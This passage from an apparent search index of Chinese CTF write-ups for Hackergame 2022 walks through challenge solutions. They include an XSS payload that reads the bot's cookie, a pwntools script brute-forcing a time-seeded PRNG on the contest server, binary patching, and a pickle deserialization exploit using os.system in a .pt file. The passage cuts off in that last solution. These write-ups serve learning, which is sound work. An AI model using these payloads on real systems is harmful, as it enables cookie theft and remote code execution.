\u8bed\u8a00\u4ee3\u7801\uff0c\u5373\u4f7f\u8bf7\u6765\u4e00\u4f4d\u5c11\u5e74\u73ed\u5b66\u9662\u7684\u5929\u624d\u6050\u6015\u4e5f\u65e0\u6d4e\u4e8e\u4e8b\u3002</p> <p>\u52a8\u6001\u6570\u636e</p> <p>\u4e3a\u4e86\u9632\u6b62\u6570\u636e\u610f\u5916\u6cc4\u9732\uff0c\u5c0f L \u8fd8\u7ed9 OJ \u52a0\u5165\u4e86\u52a8\u6001\u6570\u636e\u751f\u6210\u529f\u80fd\uff0c\u6bcf\u6b21\u6d4b\u8bc4\u4f1a\u968f\u673a\u751f\u6210\u4e00\u90e8\u5206\u6d4b\u8bd5\u6570\u636e\u3002\u8fd9\u6837\uff0c\u5373\u4f7f OJ \u6d4b\u8bd5\u6570\u636e\u6cc4\u9732\uff0c\u653b\u51fb\u8005\u4e5f\u6ca1\u529e\u6cd5\u901a\u8fc7\u6240\u6709\u6d4b\u8bd5\u6837\u4f8b\u4e86\u5427\uff01\uff08\u4e5f\u8bb8\u5427\uff1f\uff09</p> <p>\u7b2c\u4e00\u9898\u5c31\u662f\u4f7f\u7528 ./data/static.in \u548c ./data/static.out \u4f5c\u4e3a\u8f93\u5165\u8f93\u51fa\u3002\u800c\u4e14\u4e5f\u6ca1\u6709\u8bbe\u7f6e\u6743\u9650\uff0c\u6240\u4ee5\u76f4\u63a5\u8bfb\u53d6 ./data/static.out \u5185\u5bb9\u5e76\u8f93\u51fa\u5373\u53ef\u3002flag\uff1aflag{the_compiler_is_my_eyes_b18ad6f041}</p> <p>\u7b2c\u4e8c\u9898\u52a8\u6001\u751f\u6210\u6570\u636e\uff0c\u800c\u4e14\u8bbe\u7f6e\u4e86\u6743\u9650\uff0c\u7528\u6237\u4e0d\u80fd\u8bfb\u53d6\uff0c\u4e0d\u77e5\u9053\u8be5\u600e\u4e48\u505a\u3002</p>"},{"location":"writeups/hackergame2022/#_9","title":"\u7ebf\u8def\u677f","text":"<p>\u4e2d\u5348\u8d77\u5e8a\uff0c\u770b\u5230\u5ba4\u53cb\u7684\u684c\u5b50\u4e0a\u53c8\u591a\u4e86\u4e00\u4e2a\u6b63\u65b9\u5f62\u7684\u76d2\u5b50\u3002\u5feb\u9012\u6807\u7b7e\u4e0a\u4e00\u5982\u65e2\u5f80\u7684\u5199\u7740\uff1a\u7ebf\u8def\u677f\u3002\u548c\u5f80\u5e38\u4e00\u6837\uff0c\u4f60\u201c\u5e2e\u201d\u5ba4\u53cb\u62c6\u5f00\u5feb\u9012\u5e76\u62a2\u5148\u628a\u677f\u5b50\u628a\u73a9\u4e00\u756a\u3002\u53ef\u662f\u7a81\u7136\uff0c\u4f60\u6ce8\u610f\u5230\u677f\u5b50\u8868\u9762\u4f3c\u4e4e\u5199\u7740\u4e9b\u4e1c\u897f\u2026\u2026\u770b\u8d77\u6765\u50cf\u662f\u2026\u2026flag\uff1f</p> <p>\u53ef\u662f\u53ea\u6709\u5f00\u5934\u7684\u51e0\u4e2a\u5b57\u6bcd\u53ef\u4ee5\u770b\u6e05\u695a\u3002\u4f60\u4e00\u65f6\u95f4\u4e0d\u77e5\u6240\u63aa\u3002</p> <p>\u5e78\u8fd0\u7684\u662f\uff0c\u4f60\u901a\u8fc7\u76d2\u5b50\u4e0a\u7684\u8054\u7cfb\u65b9\u5f0f\u627e\u5230\u4e86\u5236\u4f5c\u5382\u5bb6\uff0c\u901a\u8fc7\u677f\u5b50\u4e1d\u5370\u4e0a\u7684\u5e8f\u5217\u53f7\u67e5\u51fa\u4e86\u5ba4\u53cb\u7684\u5e95\u7ec6\uff0c\u5e76\u4ee5\u653e\u5f03\u6bcf\u6708\u4e24\u6b21\u514d\u8d39 PCB \u6253\u6837\u5305\u90ae\u7684\u673a\u4f1a\u4e3a\u4ee3\u4ef7\u8981\u6765\u4e86\u8fd9\u6279\u5e26\u6709 flag \u7684\u677f\u5b50\u7684\u751f\u4ea7\u6587\u4ef6\u3002\u90a3\u8fd9\u4e9b\u6587\u4ef6\u91cc\u4f1a\u4e0d\u4f1a\u5305\u542b\u7740\u66f4\u591a\u6709\u5173 flag \u7684\u4fe1\u606f\u5462\uff1f</p> <p>\u7ed9\u4e86\u4e00\u4e9b gbr \u6587\u4ef6\uff0c\u641c\u4e86\u4e00\u4e0b\u7528 Gerbv \u6253\u5f00\u3002\u53d1\u73b0 flag \u76f8\u5173\u5185\u5bb9\u5728 F_Cu \u8fd9\u90e8\u5206\u4e0a\uff0c\u6709\u4e00\u4e9b\u5706\u73af\u906e\u6321\u4e86\uff0c\u70b9\u51fb\u53bb\u6389\u5c31\u53ef\u4ee5\u770b\u89c1 flag\uff1aflag{8_1ayER_rogeRS_81ind_V1a}</p> <p></p>"},{"location":"writeups/hackergame2022/#flag_1","title":"Flag \u81ea\u52a8\u673a","text":"<p>Hackergame 2022 \u7ec4\u59d4\u4f1a\u4e3a\u5927\u5bb6\u642c\u6765\u4e86\u4e00\u53f0\u80fd\u591f\u81ea\u52a8\u83b7\u53d6 flag \u7684\u673a\u5668\u3002\u7136\u800c\uff0c\u60f3\u8981\u63d0\u53d6\u51fa\u5176\u4e2d\u7684 flag \u4f3c\u4e4e\u6ca1\u90a3\u4e48\u7b80\u5355\u2026\u2026</p> <p>\u4e00\u4e2a\u4f7f\u7528 Win32 API \u7684\u7a97\u53e3\u7a0b\u5e8f\u7684\u9006\u5411\u3002\u593a\u53d6 flag \u7684\u6309\u94ae\u70b9\u4e0d\u4e0a\u3002\u9006\u5411\u4e00\u4e0b\uff0c\u5728 WinMain \u51fd\u6570\u91cc\u770b\u5230\u6ce8\u518c\u4e86\u4e00\u4e2a\u4e8b\u4ef6\u5904\u7406\u51fd\u6570\u5728 0x401510 \u5904\u3002\u679a\u4e3e\u4e86 msg \u7684\u503c\uff0c\u4e5f\u5c31\u662f\u4e8b\u4ef6\uff1a</p> <ul> <li>1\uff1a\u5373\u521b\u5efa\u7a97\u53e3\uff0c\u521b\u5efa\u4e86\u4e09\u4e2a\u6309\u94ae\uff0c\u4e00\u4e2a\u662f \u201c\u72e0\u5fc3\u593a\u53d6\u201d\uff0c\u5bf9\u5e94\u7684 hMENU \u4e3a 3\uff0c\u4e00\u4e2a \u201c\u653e\u624b\u79bb\u5f00\u201d\uff0chMENU \u4e3a 2\uff0c\u4e00\u4e2a\u6ca1\u6709\u663e\u793a\u4e0d\u7ba1</li> <li>0x111\uff1a\u5373\u70b9\u51fb\uff0c\u6b64\u65f6\u7684\u53c2\u6570 wParam\uff08\u5373 a3\uff09\u4e3a\u70b9\u51fb\u7684\u6309\u94ae\u7684 hMENU\uff0c\u5f53 a3 \u4e3a 2 \u65f6\u9000\u51fa\uff0ca3 \u4e3a 3 \u65f6\u68c0\u67e5 lParam \u662f\u5426\u4e3a 114514\uff0c\u5982\u679c\u662f\u5219\u8f93\u51fa flag \u5230\u6587\u4ef6\u4e2d</li> </ul> <p>\u56e0\u6b64\u53ef\u4ee5\u76f4\u63a5\u5728\u6c47\u7f16\u91cc patch \u4e00\u4e0b\u7a0b\u5e8f\uff0c\u5c06\u5224\u65ad a3 \u4e3a 2 \u6216 3 \u8c03\u6362\u4e00\u4e0b\uff0c\u7136\u540e\u518d\u5c06\u5224\u65ad lParam \u7684 jz \u53d8\u6210 jnz\u3002\u4e4b\u540e Apply\u3001\u8fd0\u884c\u70b9\u51fb\u653e\u624b\u79bb\u5f00\u5373\u53ef\u8f93\u51fa flag\uff1aflag{Y0u_rea1ly_kn0w_Win32API_\u2026\u2026}</p>"},{"location":"writeups/hackergame2022/#_10","title":"\u676f\u7a97\u9e45\u5f71","text":"<p>\u8bf4\u5230\u4e0a\u56de\uff0c\u5c0f K \u5728\u83b7\u5f97\u4e86\u5b9e\u9a8c\u5ba4\u9ad8\u6027\u80fd\u670d\u52a1\u5668\u7684\u8bbf\u95ee\u6743\u9650\u4e4b\u540e\u5c31\u8fc1\u79fb\u4e86\u6570\u636e\uff08\u4ed6\u76f4\u5230\u73b0\u5728\u90fd\u8fd8\u4e0d\u77e5\u9053\u81ea\u5df1\u7684\u5bb6\u76ee\u5f55\u5907\u4efd\u88ab Eve \u4e0b\u8f7d\u4e86\uff09\u3002\u4e4b\u540e\uff0c\u4e3a\u4e86\u8dd1\u4e00\u4e9b\u522b\u4eba\u5199\u7684\u5728 Windows \u4e0b\u7684\u8ba1\u7b97\u7a0b\u5e8f\uff0c\u4ed6\u5b89\u88c5\u4e86 wine \u6765\u8fd0\u884c\u5b83\u4eec\u3002</p> <p>\u300c\u4f60\u7528 wine \u8dd1 Windows \u7a0b\u5e8f\uff0c\u8981\u662f\u4e2d\u6bd2\u4e86\u548b\u529e\uff1f\u300d</p> <p>\u300c\u6ca1\u5173\u7cfb\uff0c\u5927\u4e0d\u4e86\u628a wineprefix \u5220\u4e86\u5c31\u884c\u3002\u6211\u8bbe\u7f6e\u8fc7\u4e86\u78c1\u76d8\u6620\u5c04\uff0cWindows \u7a0b\u5e8f\u662f\u8bfb\u4e0d\u5230\u6211\u7684\u6587\u4ef6\u7684\uff01\u300d</p> <p>\u4f46\u679c\u771f\u5982\u6b64\u5417\uff1f</p> <p>\u4e3a\u4e86\u9a8c\u8bc1\u8fd9\u4e00\u70b9\uff0c\u4f60\u9700\u8981\u70b9\u51fb\u300c\u6253\u5f00/\u4e0b\u8f7d\u9898\u76ee\u300d\u6309\u94ae\uff0c\u4e0a\u4f20\u4f60\u7684\u7a0b\u5e8f\u5b9e\u73b0\u4ee5\u4e0b\u7684\u76ee\u7684\uff1a</p> <ol> <li>/flag1 \u653e\u7f6e\u4e86\u7b2c\u4e00\u4e2a flag\u3002\u4f60\u80fd\u7ed9\u51fa\u4e00\u4e2a\u80fd\u5728 wine \u4e0b\u8fd0\u884c\u7684 x86_64 \u67b6\u6784\u7684 Windows \u547d\u4ee4\u884c\u7a0b\u5e8f\u6765\u8bfb\u53d6\u5230\u7b2c\u4e00\u4e2a flag \u5417\uff1f</li> <li>/flag2 \u653e\u7f6e\u4e86\u7b2c\u4e8c\u4e2a flag\uff0c\u4f46\u662f\u9700\u8981\u4f7f\u7528 /readflag \u7a0b\u5e8f\u624d\u80fd\u770b\u5230 /flag2 \u7684\u5185\u5bb9\u3002\u4f60\u80fd\u7ed9\u51fa\u4e00\u4e2a\u80fd\u5728 wine \u4e0b\u8fd0\u884c\u7684 x86_64 \u67b6\u6784\u7684 Windows \u547d\u4ee4\u884c\u7a0b\u5e8f\u6765\u6267\u884c /readflag \u7a0b\u5e8f\u6765\u8bfb\u53d6\u5230\u7b2c\u4e8c\u4e2a flag \u5417\uff1f</li> </ol> <p>\u7b2c\u4e00\u4e2a flag \u4e5f\u5f88\u7b80\u5355\uff0c\u76f4\u63a5\u8bfb\u53d6 /flag1 \u8f93\u51fa\u5c31\u53ef\u4ee5\u4e86\u3002</p> <p>\u7b2c\u4e8c\u4e2a flag \u641e\u7684\u65f6\u5019\u8bd5\u8fc7 system\u3001execl \u5565\u7684\uff0c\u4e00\u4e9b\u547d\u4ee4\u90fd\u6ca1\u529e\u6cd5\u6267\u884c\uff0c\u4e0d\u77e5\u9053\u8be5\u600e\u4e48\u529e\uff0c\u4e0d\u60f3\u7814\u7a76\u4e86\uff0c\u5f00\u6446</p>"},{"location":"writeups/hackergame2022/#_11","title":"\u5fae\u79ef\u5206\u8ba1\u7b97\u5c0f\u7ec3\u4e60","text":"<p>\u5c0f X \u4f5c\u4e3a\u67d0\u95e8\u7b26\u53f7\u8ba1\u7b97\u8bfe\u7a0b\u7684\u52a9\u6559\uff0c\u4e3a\u4e86\u8ba9\u5927\u5bb6\u719f\u6089\u8f6f\u4ef6\u7684\u4f7f\u7528\uff0c\u4ed6\u5199\u4e86\u4e00\u4e2a\u5c0f\u7f51\u7ad9\uff1a\u4e0a\u9762\u653e\u7740\u4e94\u9053\u7b80\u5355\u7684\u9898\u76ee\uff0c\u53ea\u8981\u8f93\u5165\u59d3\u540d\u548c\u9898\u76ee\u7b54\u6848\uff0c\u63d0\u4ea4\u540e\u5c31\u53ef\u4ee5\u770b\u5230\u81ea\u5df1\u7684\u5206\u6570\u3002</p> <p>\u70b9\u51fb\u6b64\u94fe\u63a5\u8bbf\u95ee\u7ec3\u4e60\u7f51\u7ad9\uff08\u6ca1\u94fe\u63a5\uff09</p> <p>\u60f3\u8d77\u81ea\u5df1\u524d\u51e0\u5929\u5728\u516c\u4f17\u53f7\u4e0a\u5b66\u8fc7\u7684 Java \u8bbe\u8ba1\u6a21\u5f0f\u514d\u8d39\u8bd5\u542c\u8bfe\uff0c\u672c\u7740\u524d\u540e\u7aef\u79bb\u5fc3\uff08\u54a6\uff1f\u662f\u524d\u540e\u7aef\u79bb\u5fc3\u5417\uff1f\u8fd8\u662f\u79bb\u5a5a\uff1f\u79bb\u3002\u3002\u79bb\u8c31\uff1f\u603b\u4e4b\u628a\u529f\u80fd\u80fd\u62c6\u5219\u62c6\u5c31\u5bf9\u5566\uff09\u7684\u601d\u60f3\uff0c\u5c0f X \u8fd8\u5355\u72ec\u5199\u4e86\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u6b22\u8fce\u540c\u5b66\u4eec\u628a\u81ea\u5df1\u7684\u6210\u7ee9\u94fe\u63a5\u63d0\u4ea4\u4e0a\u6765\u3002</p> <p>\u603b\u4e4b\uff0c\u56e0\u4e3a\u5176\u5148\u8fdb\u7684\u8bbe\u8ba1\u601d\u60f3\uff0c\u9700\u8981\u540c\u5b66\u4eec\u505a\u5b8c\u7ec3\u4e60\u4e4b\u540e\u624b\u52a8\u628a\u6210\u7ee9\u8fde\u63a5\u8d34\u5230\u8fd9\u91cc\u6765\uff1a</p> <p>\u70b9\u51fb\u6b64\u94fe\u63a5\u63d0\u4ea4\u7ec3\u4e60\u6210\u7ee9 URL\uff08\u6ca1\u94fe\u63a5\uff09</p> <p>\u70b9\u8fdb\u7b2c\u4e00\u4e2a\u94fe\u63a5\uff0c\u968f\u4fbf\u505a\u4e00\u904d\uff0c\u5f97\u5230\u6210\u7ee9\u5206\u4eab\u9875\u9762 <code>/share?result=...</code>\uff0c\u7136\u540e\u5c06\u94fe\u63a5\u8d34\u5230\u7b2c\u4e8c\u4e2a\u94fe\u63a5\u91cc\uff0c\u4f1a\u81ea\u52a8\u8bfb\u53d6\u51fa\u540d\u5b57\u548c\u6210\u7ee9\u3002</p> <p>\u8bfb\u53d6\u7684\u8fc7\u7a0b\u662f\u7528 selenium \u6253\u5f00\u4e00\u4e2a\u6d4f\u89c8\u5668\uff0cGET login \u7136\u540e\u5c06 flag \u653e\u5165 cookie\uff0c\u5728 GET \u8f93\u5165\u7684 url\uff08\u4f1a\u66ff\u6362\u6389 netloc \u4e3a web\uff0cscheme \u4e3a http\uff09\uff0c\u7136\u540e\u8bfb\u53d6 #greeting \u548c #score \u7684\u5185\u5bb9\u3002</p> <p>\u518d\u770b\u7b2c\u4e00\u4e2a\u94fe\u63a5\uff0c\u5176 result \u662f\u53ef\u4ee5\u6784\u9020\u7684\uff0c\u76f8\u5173\u903b\u8f91\uff1a <pre><code>const queryString = window.location.search;\nconst urlParams = new URLSearchParams(queryString);\nconst result = urlParams.get('result');\nconst b64decode = atob(result);\nconst colon = b64decode.indexOf(\":\");\nconst score = b64decode.substring(0, colon);\nconst username = b64decode.substring(colon + 1);\n\ndocument.querySelector(\"#greeting\").innerHTML = \"\u60a8\u597d\uff0c\" + username + \"\uff01\";\ndocument.querySelector(\"#score\").innerHTML = \"\u60a8\u5728\u7ec3\u4e60\u4e2d\u83b7\u5f97\u7684\u5206\u6570\u4e3a &lt;b&gt;\" + score + \"&lt;/b&gt;/100\u3002\";\n</code></pre> \u4e5f\u5c31\u662f\u5c06 result base64 \u89e3\u7801\uff0c: \u524d\u9762\u7684\u4e3a\u5206\u6570\uff0c\u540e\u9762\u7684\u4e3a\u7528\u6237\u540d\uff0c\u7136\u540e\u586b\u5199\u8fdb\u53bb\u3002\u8fd9\u91cc\u5c31\u53ef\u4ee5\u8fdb\u884c xss\u3002\u6ca1\u5b66\u8fc7 xss\uff0c\u6240\u4ee5\u60f3\u4e86\u534a\u5929\u63d2\u5165\u4e00\u4e2a script tag \u4e4b\u540e\u600e\u4e48\u8ba9\u5904\u5728\u524d\u9762\u7684\u5b83\u88ab\u8fd0\u884c\uff0c\u540e\u6765\u641c\u4e86\u641c\u624d\u77e5\u9053\u53ef\u4ee5\u5229\u7528 onload onerror \u8fd9\u4e9b\u4e8b\u4ef6\u6765\u586b\u5199\u811a\u672c\u3002</p> <p>\u6240\u4ee5 payload \u5c31\u662f <code>100:&lt;img src=1 onerror=\"document.querySelector('#greeting').innerHTML=document.cookie\"&gt;</code>\uff0c\u7136\u540e base64 \u540e\u4f5c\u4e3a result \u4f20\u5165\uff0c\u518d\u4e22\u7ed9\u7b2c\u4e8c\u4e2a\u63d0\u4ea4\u94fe\u63a5\uff0c\u5f97\u5230 flag\uff1aflag{xS5_1OI_is_N0t_SOHARD_3c97784c1a}</p>"},{"location":"writeups/hackergame2022/#_12","title":"\u8499\u7279\u5361\u7f57\u8f6e\u76d8\u8d4c","text":"<p>\u8fd9\u4e2a\u4f30\u7b97\u5706\u5468\u7387\u7684\u7ecf\u5178\u7b97\u6cd5\u4f60\u4e00\u5b9a\u542c\u8bf4\u8fc7\uff1a\u5f80\u4e00\u4e2a 1x1 \u5927\u5c0f\u7684\u65b9\u683c\u91cc\u968f\u673a\u6492 N \u4e2a\u70b9\uff0c\u7edf\u8ba1\u843d\u5728\u4ee5\u65b9\u683c\u67d0\u4e2a\u9876\u70b9\u4e3a\u5706\u5fc3\u30011 \u4e3a\u534a\u5f84\u7684 1/4 \u6247\u5f62\u533a\u57df\u4e2d\u6492\u843d\u7684\u70b9\u6570\u4e3a M\uff0c\u90a3\u4e48 M/N \u5c31\u5c06\u63a5\u8fd1\u4e8e \u03c0/4 \u3002</p> <p>\u5f53\u7136\uff0c\u8fd9\u662f\u4e00\u4e2a\u6982\u7387\u6027\u7b97\u6cd5\uff0c\u5982\u679c\u60f3\u5f97\u5230\u66f4\u7cbe\u786e\u7684\u503c\uff0c\u5c31\u9700\u8981\u6492\u66f4\u591a\u7684\u70b9\u3002\u7531\u4e8e\u6492\u70b9\u662f\u968f\u673a\u7684\uff0c\u81ea\u7136\u4e5f\u65e0\u6cd5\u9884\u6d4b\u67d0\u6b21\u6492\u70b9\u5b9e\u9a8c\u5f97\u5230\u7684\u7ed3\u679c\u5230\u5e95\u662f\u591a\u5c11\u2014\u2014\u4f46\u771f\u7684\u662f\u8fd9\u6837\u5417\uff1f</p> <p>\u6709\u4f4d\u597d\u4e8b\u4e4b\u5f92\u51b3\u5b9a\u501f\u6b64\u548c\u4f60\u6765\u4e00\u573a\u8f6e\u76d8\u8d4c\uff1a\u6492 40 \u4e07\u4e2a\u70b9\u8ba1\u7b97\u5706\u5468\u7387\uff0c\u800c\u4f60\u9700\u8981\u731c\u6d4b\u5b9e\u9a8c\u7684\u7ed3\u679c\u7cbe\u786e\u5230\u5c0f\u6570\u70b9\u540e\u4e94\u4f4d\u3002\u4e3a\u4e86\u9632\u6b62\u8fd0\u6c14\u592a\u597d\u78b0\u5de7\u731c\u4e2d\uff0c\u4f60\u4eec\u7ea6\u5b9a\u4e94\u5c40\u4e09\u80dc\u3002</p> <p>\u770b\u8d77\u6765\u6ca1\u4ec0\u4e48\u5176\u5b83\u6f0f\u6d1e\uff0c\u4ece\u4f2a\u968f\u673a\u5165\u624b\uff0c\u8bbe\u7f6e\u7684\u968f\u673a\u79cd\u5b50\u4e3a time(0)+clock()\uff0c\u4e5f\u5c31\u662f\u5f53\u524d\u65f6\u95f4\u6233\u52a0\u4e0a\u7a0b\u5e8f\u8fd0\u884c\u5230\u6b64\u5904\u7684 ticks \u6570\u3002\u65f6\u95f4\u6233\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff0c\u6ce2\u52a8\u4e0d\u5927\uff0c\u76f4\u63a5\u4f7f\u7528\u8fde\u63a5\u65f6\u7684\u65f6\u95f4\u6233\u5c31\u53ef\u4ee5\u3002clock() \u4f1a\u6709\u8f83\u5927\u6ce2\u52a8\uff0c\u4ece 0 \u5f00\u59cb\u679a\u4e3e\uff0c\u5c06\u5f97\u5230\u7684\u503c\u4f20\u5165\u4e00\u4e2a C \u7a0b\u5e8f\u4e2d\u4f5c\u4e3a\u968f\u673a\u79cd\u5b50\uff0c\u6a21\u62df\u4e00\u4e0b\uff0c\u770b\u4e00\u770b\u524d\u4e24\u4e2a\u662f\u5426\u80fd\u548c\u6b63\u786e\u7ed3\u679c\u5bf9\u4e0a\u3002\u80fd\u5bf9\u4e0a\u5219\u8bf4\u660e\u968f\u673a\u79cd\u5b50\u627e\u5bf9\u4e86\uff0c\u5c06\u540e\u4e09\u4e2a\u7ed3\u679c\u8f93\u56de\u53bb\u5373\u53ef\u5b8c\u6210\u3002</p> <pre><code>import time\nimport subprocess\nfrom tqdm import tqdm\nfrom pwn import *\n\n# p = process('./challenge')\np = remote(\"202.38.93.111\", 10091)\ntoken = \"...\"\np.sendlineafter(b\": \", token.encode())\ntimestamp = int(time.time())\n\ndef crack_seed(res1, res2):\n    for clock in tqdm(range(0, 9000)):\n        seed = timestamp + clock\n        cracker = subprocess.run(\n            [\"./exp\", str(seed)],\n            stdout=subprocess.PIPE,\n        )\n        res = cracker.stdout.decode().strip().split('\\n')\n        if res[0] == str(res1) and res[1] == str(res2):\n            print(seed)\n            return res\n        seed = timestamp - clock\n        cracker = subprocess.run(\n            [\"./exp\", str(seed)],\n            stdout=subprocess.PIPE,\n        )\n        res = cracker.stdout.decode().strip().split('\\n')\n        if res[0] == str(res1) and res[1] == str(res2):\n            print(seed)\n            return res\n    exit(1)\n\np.recvuntil(\"\uff1a\".encode(\"utf-8\"))\np.sendline(b'3.14159')\nwin = p.recvline().decode().strip()\nif win == \"\u731c\u5bf9\u4e86\uff01\":\n    res1 = \"3.14159\"\nelse:\n    p.recvuntil(\"\uff1a\".encode(\"utf-8\"))\n    res1 = p.recvline().decode().strip()\n\np.recvuntil(\"\uff1a\".encode(\"utf-8\"))\np.sendline(b'3.14159')\nwin = p.recvline().decode().strip()\nif win == \"\u731c\u5bf9\u4e86\uff01\":\n    res2 = \"3.14159\"\nelse:\n    p.recvuntil(\"\uff1a\".encode(\"utf-8\"))\n    res2 = p.recvline().decode().strip()\n\nprint(res2)\nres = crack_seed(res1, res2)\n\np.recvuntil(\"\uff1a\".encode(\"utf-8\"))\np.sendline(res[2].encode(\"utf-8\"))\np.recvuntil(\"\uff1a\".encode(\"utf-8\"))\np.sendline(res[3].encode(\"utf-8\"))\np.recvuntil(\"\uff1a\".encode(\"utf-8\"))\np.sendline(res[4].encode(\"utf-8\"))\np.interactive()\n</code></pre> <p>\u8fd0\u884c\u5f97\u5230 flag\uff1aflag{raNd0m_nUmb34_a1wayS_m4tters_\u2026\u2026}</p> <p>\u54e6\u5bf9\u4e86\uff0c\u6709\u4e00\u4e2a\u5f88\u5751\u7684\u70b9\u662f mac \u4e0a\u7684 gcc \u5176\u5b9e\u662f clang \u7684 alias\uff0c\u800c clang \u548c gcc \u7684\u968f\u673a\u6570\u6709\u533a\u522b\uff0c\u5728 mac \u4e0a\u8dd1\u7684\u8bdd\u5c31\u4e00\u76f4\u7206\u4e0d\u51fa\u6765\u79cd\u5b50\u3002\u5728 Linux \u4e0a\u5c31\u53ef\u4ee5\u4e00\u4e0b\u7206\u51fa\u6765\u3002</p>"},{"location":"writeups/hackergame2022/#_13","title":"\u4e8c\u6b21\u5143\u795e\u7ecf\u7f51\u7edc","text":"<p>\u5929\u51b7\u6781\u4e86\uff0c\u4e0b\u7740\u96ea\uff0c\u53c8\u5feb\u9ed1\u4e86\u3002\u8fd9\u662f\u4e00\u5e74\u7684\u6700\u540e\u4e00\u5929\u2014\u2014\u5927\u5e74\u591c\u3002\u5728\u8fd9\u53c8\u51b7\u53c8\u9ed1\u7684\u665a\u4e0a\uff0c\u4e00\u4e2a\u6ca1\u6709 GPU\u3001\u6ca1\u6709 TPU \u7684\u5c0f\u5973\u5b69\uff0c\u5728\u8857\u4e0a\u7f13\u7f13\u5730\u8d70\u7740\u3002\u5979\u4ece\u5bb6\u91cc\u51fa\u6765\u7684\u65f6\u5019\u8fd8\u5e26\u7740\u6361\u5783\u573e\u6361\u6765\u7684 E3 \u5904\u7406\u5668\uff0c\u4f46\u662f\u6709\u4ec0\u4e48\u7528\u5462\uff1f\u8dd1\u4e0d\u52a8 Stable Diffusion\uff0c\u4e5f\u8dd1\u4e0d\u52a8 NovelAI\u3002\u5979\u4e5f\u60f3\u7528\u81ea\u5df1\u7684\u5904\u7406\u5668\u8bad\u7ec3\u4e00\u4e2a\u795e\u7ecf\u7f51\u7edc\uff0c\u751f\u6210\u4e00\u4e9b\u4e8c\u6b21\u5143\u7684\u56fe\u7247\u3002</p> <p>\u4e8e\u662f\u5979\u914d\u7f6e\u597d\u4e86 PyTorch 1.9.1\uff0c\u5b9a\u4e49\u4e86\u4e00\u4e2a\u6781\u5176\u7b80\u5355\u7684\u6a21\u578b\uff0c\u7528\u81ea\u5df1\u6536\u96c6\u7684 10 \u5f20\u4e8c\u6b21\u5143\u56fe\u7247\u548c\u5bf9\u5e94\u7684\u6807\u7b7e\u5f00\u59cb\u4e86\u8bad\u7ec3\u3002</p> <p>\u5979\u5728 CPU \u4e0a\u5f00\u59cb\u4e86\u7b2c\u4e00\u4e2a epoch \u7684\u8bad\u7ec3\uff0closs \u4e00\u76f4\u5728\u4e0b\u964d\uff0c\u8bb8\u591a\u4e8c\u6b21\u5143\u56fe\u7247\u91cd\u53e0\u5728\u4e00\u8d77\uff0c\u5728\u5411\u5979\u7728\u773c\u775b\u3002</p> <p>\u5979\u53c8\u5f00\u59cb\u4e86\u7b2c\u4e8c\u4e2a epoch\uff0closs \u8d8a\u6765\u8d8a\u4f4e\uff0c\u56fe\u7247\u8d8a\u6765\u8d8a\u7cbe\u7f8e\uff0c\u5979\u7684\u773c\u775b\u4e5f\u8d8a\u6765\u8d8a\u7d2f\uff0c\u5979\u7684\u773c\u775b\u5f00\u59cb\u95ed\u4e0a\u4e86\u3002</p> <p>...</p> <p>\u7b2c\u4e8c\u5929\u6e05\u6668\uff0c\u8fd9\u4e2a\u5c0f\u5973\u5b69\u5750\u5728\u5899\u89d2\u91cc\uff0c\u4e24\u816e\u901a\u7ea2\uff0c\u5634\u4e0a\u5e26\u7740\u5fae\u7b11\u3002\u65b0\u5e74\u7684\u592a\u9633\u5347\u8d77\u6765\u4e86\uff0c\u7167\u5728\u5979\u5c0f\u5c0f\u7684\u5c38\u4f53\u4e0a\u3002</p> <p>\u4eba\u4eec\u53d1\u73b0\u5979\u65f6\u624d\u77e5\u9053\uff0c\u5979\u7684\u6a21\u578b\u5728 10 \u5f20\u56fe\u7247\u4e0a\u8fc7\u62df\u5408\u4e86\uff0c\u51e0\u4e4e\u6ca1\u6709\u8bef\u5dee\u3002</p> <p>\uff08\u5b8c\uff09</p> <p>\u542c\u5b8c\u8fd9\u4e2a\u6545\u4e8b\uff0c\u4f60\u4e00\u8138\u7684\u4e0d\u76f8\u4fe1\uff1a\u300c\u8fd9\u4e48\u7b80\u5355\u7684\u6a21\u578b\u600e\u4e48\u53ef\u80fd\u6ca1\u6709\u8bef\u5dee\u5462\uff1f\u300d\uff0c\u4e8e\u662f\u4f60\u5f00\u59cb\u590d\u73b0\u8fd9\u4e2a\u4e8c\u6b21\u5143\u795e\u7ecf\u7f51\u7edc\u3002</p> <p>\u76ee\u6807\u770b\u8d77\u6765\u5c31\u662f\u8ba9\u6a21\u578b\u751f\u6210\u7684\u56fe\u7247\u548c\u9884\u671f\u51e0\u4e4e\u6ca1\u6709\u8bef\u5dee\u3002\u8bd5\u7740\u591a\u8bad\u7ec3\u51e0\u8f6e\uff0c\u8bd5\u56fe\u8fc7\u62df\u5408\uff0c\u8bb0\u5f55\u4e00\u4e0b loss\uff0c\u53d1\u73b0\u964d\u5230 0.001+ \u7684\u65f6\u5019\u5c31\u964d\u4e0d\u4e0b\u53bb\u4e86\uff0c\u800c\u9700\u8981\u7684\u662f 0.0005 </p> <p>\u770b\u8d77\u6765\u4e0d\u53ef\u884c\u3002\u800c\u4e14\u8fd9\u662f\u4e00\u9053 web \u7c7b\u9898\uff0c\u8003\u8651\u7528\u4e00\u4e9b\u624b\u6bb5\u6765\u8ba9\u5b83\u8ba4\u4e3a\u6211\u7684\u8f93\u51fa\u662f\u5b8c\u5168\u6b63\u786e\u7684\u3002</p> <p>\u641c\u7d22\u53ef\u4ee5\u53d1\u73b0\u5b58\u7684 .pt \u6587\u4ef6\u4e2d\u6709\u4f7f\u7528 pickle \u5e8f\u5217\u5316\u5b58\u50a8\u7684 .pkl \u6587\u4ef6\u3002\u800c\u5728\u8bfb\u53d6\u7684\u65f6\u5019\u4e5f\u4f1a\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\uff0c\u8fd9\u4e5f\u5c31\u5b58\u5728\u4e00\u4e2a pickle \u53cd\u5e8f\u5217\u5316\u7684\u6f0f\u6d1e\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u81ea\u5df1\u5199\u4e00\u4e2a\u6076\u610f\u7c7b\u7136\u540e\u6253\u5305\u5230 data.pkl \u538b\u7f29\u8fdb .pt \u6587\u4ef6\uff0c\u5728\u53cd\u5e8f\u5217\u5316\u7684\u65f6\u5019\u5c31\u4f1a\u6267\u884c\u5176\u4e2d\u7684\u4ee3\u7801\uff0c\u6bd4\u5982\uff1a <pre><code>class Exploit(object):\n    def __reduce__(self):\n        return (os.system, (\"...\", ))\n</code></pre> 